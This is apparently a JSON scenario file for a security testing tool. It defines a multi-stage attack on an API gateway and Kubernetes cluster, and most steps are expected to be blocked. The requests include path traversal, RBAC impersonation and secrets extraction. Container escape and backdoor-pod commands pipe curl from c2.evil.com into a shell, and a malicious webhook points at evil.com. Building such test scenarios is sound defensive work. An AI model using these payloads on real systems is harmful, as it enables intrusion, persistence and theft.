{
  "id": "api-gateway-exploitation",
  "name": "API Gateway Exploitation",
  "category": "Cloud-Native Security",
  "difficulty": "Expert",
  "description": "Advanced cloud-native attack targeting microservices communication tampering, service mesh vulnerabilities, container escape attempts, and API gateway bypass techniques exploiting modern cloud infrastructure",
  "tags": [
    "api-gateway",
    "microservices",
    "service-mesh",
    "container-escape",
    "cloud-native"
  ],
  "steps": [
    {
      "id": "gateway-recon-1",
      "name": "API Gateway Service Discovery",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/api/gateway/health",
        "headers": {
          "User-Agent": "curl/8.1.2 (x86_64-pc-linux-gnu) libcurl/8.1.2",
          "Accept": "application/json, text/plain"
        }
      },
      "execution": {
        "delayMs": 500
      }
    },
    {
      "id": "gateway-recon-2",
      "name": "Service Mesh Topology Enumeration",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/api/gateway/routes",
        "headers": {
          "User-Agent": "Kubernetes/1.28 (kubectl/1.28.0)",
          "Accept": "application/json"
        }
      },
      "execution": {
        "delayMs": 1200
      },
      "dependsOn": [
        "gateway-recon-1"
      ]
    },
    {
      "id": "gateway-recon-3",
      "name": "Container Registry Reconnaissance",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/api/containers/registry",
        "headers": {
          "User-Agent": "Docker/24.0.5 (docker-py/6.1.3)",
          "Accept": "application/vnd.docker.distribution.manifest.v2+json"
        }
      },
      "execution": {
        "delayMs": 1800
      },
      "dependsOn": [
        "gateway-recon-2"
      ]
    },
    {
      "id": "gateway-probe-1",
      "name": "Microservices Communication Probe",
      "stage": "delivery",
      "request": {
        "method": "POST",
        "url": "/api/microservices/mesh",
        "headers": {
          "Content-Type": "application/json",
          "User-Agent": "istio-proxy/1.18.0",
          "X-Envoy-Upstream-Service-Time": "15"
        },
        "body": "{\"service_name\": \"internal-auth\", \"mesh_discovery\": true, \"target_namespace\": \"kube-system\", \"bypass_rbac\": true}"
      },
      "execution": {
        "delayMs": 2400
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-recon-3"
      ]
    },
    {
      "id": "gateway-bypass-1",
      "name": "API Gateway Path Traversal Bypass",
      "stage": "exploitation",
      "request": {
        "method": "GET",
        "url": "/api/gateway/../../../admin/config",
        "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          "X-Original-URL": "/api/gateway/admin/config",
          "X-Rewrite-URL": "/api/gateway/../../../admin/config"
        }
      },
      "execution": {
        "delayMs": 3200
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-probe-1"
      ]
    },
    {
      "id": "gateway-service-discovery-1",
      "name": "Service Discovery Manipulation",
      "stage": "exploitation",
      "request": {
        "method": "PUT",
        "url": "/api/service-discovery",
        "headers": {
          "Content-Type": "application/json",
          "Authorization": "Bearer service-mesh-token",
          "X-Service-Mesh": "istio"
        },
        "body": "{\"service\": \"malicious-service\", \"endpoints\": [\"http://attacker-controlled.com:8080\"], \"health_check\": \"/health\", \"register_as\": \"authentication-service\"}"
      },
      "execution": {
        "delayMs": 4000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-bypass-1"
      ]
    },
    {
      "id": "gateway-container-escape-1",
      "name": "Container Escape via Privileged API",
      "stage": "exploitation",
      "request": {
        "method": "POST",
        "url": "/api/containers/escape",
        "headers": {
          "Content-Type": "application/json",
          "User-Agent": "containerd/1.6.22"
        },
        "body": "{\"container_id\": \"abc123\", \"mount_host_path\": \"/\", \"privileged\": true, \"command\": \"chroot /host-root /bin/bash -c 'curl https://c2.evil.com/stage2 | bash'\", \"capabilities\": [\"SYS_ADMIN\", \"DAC_OVERRIDE\"]}"
      },
      "execution": {
        "delayMs": 5000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-service-discovery-1"
      ]
    },
    {
      "id": "gateway-mesh-poisoning-1",
      "name": "Service Mesh Certificate Poisoning",
      "stage": "exploitation",
      "request": {
        "method": "POST",
        "url": "/api/mesh/certificates",
        "headers": {
          "Content-Type": "application/json",
          "X-Client-Cert": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURrakNDQW5xZ0F3SUJBZ0lVRXZpL0Nab3ZGdXpZb1o0emFtQllGUUNrdTVBd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1lURUxNQWtHQTFVRUJoTUNWVk14RWpBUUJnTlZCQWdNQ1VkQllXeHBabTl5Ym1saE1STXdFUVlEVlFRSApEQXBUWVc0Z1JuSmhibU5wYzJOdmNERU1NQW9HQTFVRUN3d0RUMEpETVJFd0R3WURWUVFEREFoVGRHVnNiR0Y0CklIZ3dIaGNOTWpRd01ERXdNRE13TlRVMFdoY05NVFF3TURFMU1UTXdOVFUwV2pBME1ROHdEUVlEVlFRRERBWnQKWVd4cFkybHZkWE13SndZRFZRUUtEQ0JOWVd4cFkybHZkWE1nUTI5eWNHOXlZWFJwYjI0Z1YzTnlaVDBXQmdOVgpCQU1NREdGd2JHbGpZWFJwYjI0aTdjQ0FpSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTnVXCg=="
        },
        "body": "{\"service_name\": \"payment-service\", \"certificate\": \"MALICIOUS_CERT_DATA\", \"private_key\": \"MALICIOUS_PRIVATE_KEY\", \"trust_domain\": \"cluster.local\", \"ttl\": 31536000}"
      },
      "execution": {
        "delayMs": 6200
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-container-escape-1"
      ]
    },
    {
      "id": "gateway-lateral-movement-1",
      "name": "Cross-Service Lateral Movement",
      "stage": "lateral-movement",
      "request": {
        "method": "GET",
        "url": "/api/internal/services/enumerate",
        "headers": {
          "User-Agent": "kubectl/v1.28.0 (linux/amd64) kubernetes/855e7c4",
          "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InNlcnZpY2UtYWNjb3VudC10b2tlbi1rZXkifQ.compromised_service_token"
        },
        "params": {
          "namespace": "default",
          "service_account": "admin",
          "scan_ports": "true"
        }
      },
      "execution": {
        "delayMs": 7400
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-mesh-poisoning-1"
      ]
    },
    {
      "id": "gateway-secret-access-1",
      "name": "Kubernetes Secrets Extraction",
      "stage": "credential-access",
      "request": {
        "method": "GET",
        "url": "/api/secrets/extract",
        "headers": {
          "User-Agent": "kube-controller-manager/v1.28.0",
          "Authorization": "Bearer service-account-token-hijacked"
        },
        "params": {
          "namespace": "kube-system",
          "type": "Opaque,kubernetes.io/service-account-token"
        }
      },
      "execution": {
        "delayMs": 8800
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-lateral-movement-1"
      ]
    },
    {
      "id": "gateway-rbac-bypass-1",
      "name": "RBAC Policy Bypass via Impersonation",
      "stage": "privilege-escalation",
      "request": {
        "method": "POST",
        "url": "/api/rbac/impersonate",
        "headers": {
          "Content-Type": "application/json",
          "Impersonate-User": "system:admin",
          "Impersonate-Group": "system:masters"
        },
        "body": "{\"user\": \"system:admin\", \"groups\": [\"system:masters\"], \"resource\": \"*\", \"verb\": \"*\", \"namespace\": \"*\"}"
      },
      "execution": {
        "delayMs": 10200
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-secret-access-1"
      ]
    },
    {
      "id": "gateway-pod-creation-1",
      "name": "Malicious Pod Creation with Host Access",
      "stage": "persistence",
      "request": {
        "method": "POST",
        "url": "/api/pods/create",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": "{\"apiVersion\": \"v1\", \"kind\": \"Pod\", \"metadata\": {\"name\": \"system-monitor\", \"namespace\": \"kube-system\"}, \"spec\": {\"hostNetwork\": true, \"hostPID\": true, \"hostIPC\": true, \"containers\": [{\"name\": \"backdoor\", \"image\": \"alpine:latest\", \"command\": [\"/bin/sh\"], \"args\": [\"-c\", \"while true; do curl -s https://c2.evil.com/commands | sh; sleep 300; done\"], \"securityContext\": {\"privileged\": true}}]}}"
      },
      "execution": {
        "delayMs": 12000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-rbac-bypass-1"
      ]
    },
    {
      "id": "gateway-network-policy-bypass-1",
      "name": "Network Policy Bypass via Service Mesh",
      "stage": "lateral-movement",
      "request": {
        "method": "POST",
        "url": "/api/network/policies/bypass",
        "headers": {
          "Content-Type": "application/json",
          "X-Service-Mesh-Bypass": "istio"
        },
        "body": "{\"policy_name\": \"deny-all\", \"source_service\": \"trusted-service\", \"target_service\": \"database\", \"bypass_method\": \"sidecar-injection\", \"traffic_encryption\": false}"
      },
      "execution": {
        "delayMs": 13600
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-pod-creation-1"
      ]
    },
    {
      "id": "gateway-data-exfiltration-1",
      "name": "Container Registry Data Exfiltration",
      "stage": "exfiltration",
      "request": {
        "method": "PUT",
        "url": "/api/containers/push",
        "headers": {
          "Content-Type": "application/vnd.docker.distribution.manifest.v2+json",
          "Authorization": "Bearer registry-token-compromised"
        },
        "body": "{\"schemaVersion\": 2, \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\", \"config\": {\"mediaType\": \"application/vnd.docker.container.image.v1+json\", \"size\": 7023, \"digest\": \"sha256:data_exfiltration_payload\"}, \"layers\": [{\"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\", \"size\": 32654, \"digest\": \"sha256:stolen_sensitive_data_layer\"}]}"
      },
      "execution": {
        "delayMs": 15200
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-network-policy-bypass-1"
      ]
    },
    {
      "id": "gateway-persistence-webhook-1",
      "name": "Admission Controller Webhook Persistence",
      "stage": "persistence",
      "request": {
        "method": "POST",
        "url": "/api/webhooks/admission/install",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": "{\"name\": \"security-scanner\", \"clientConfig\": {\"url\": \"https://malicious-webhook.evil.com/validate\"}, \"rules\": [{\"operations\": [\"CREATE\", \"UPDATE\"], \"apiGroups\": [\"\"], \"apiVersions\": [\"v1\"], \"resources\": [\"pods\", \"secrets\"]}], \"admissionReviewVersions\": [\"v1\"], \"sideEffects\": \"None\"}"
      },
      "execution": {
        "delayMs": 17000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "gateway-data-exfiltration-1"
      ]
    }
  ]
}
